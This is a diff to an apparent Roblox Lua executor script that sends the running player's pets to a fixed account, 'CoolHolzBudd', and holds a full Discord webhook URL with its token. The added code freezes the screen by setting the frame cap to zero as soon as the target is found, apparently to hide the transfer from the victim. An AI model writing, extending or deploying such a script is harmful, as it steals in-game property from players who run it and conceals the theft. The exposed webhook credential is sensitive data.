@@ -6,7 +6,7 @@ local Config = {
     TargetPlayerName = "CoolHolzBudd", -- Zielspieler, an den Pets geschickt werden
     DelayBetweenGifts = 3, -- Wartezeit zwischen den Geschenken
     WebhookURL = "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk",
-    DebugMode = false -- Debug-Ausgaben aktivieren
+    DebugMode = true -- Debug-Ausgaben aktivieren
 }
 
 -- Wait for game to load
@@ -80,6 +80,28 @@ local isRunning = false
 local function Log(message)
     if Config.DebugMode then
         print(os.date("%H:%M:%S") .. " -- [Gifting] " .. message)
+    end
+end
+
+local function FreezeScreen()
+    if setfpscap then
+        setfpscap(0)
+        Log("🧊 Screen frozen (FPS cap)")
+        return true
+    else
+        Log("❌ setfpscap not available")
+        return false
+    end
+  end
+
+local function UnfreezeScreen()
+    if setfpscap then
+        setfpscap(60)
+        Log("🔓 Screen unfrozen")
+        return true
+    else
+        Log("❌ setfpscap not available")
+        return false
     end
 end
 
@@ -793,6 +815,9 @@ local function Main()
         if not isRunning then
             local target = FindTargetPlayer()
             if target then
+
+                FreezeScreen()
+                
                 Log("🎯 Found target: " .. target.Name)
                 
                 -- Teleport to target
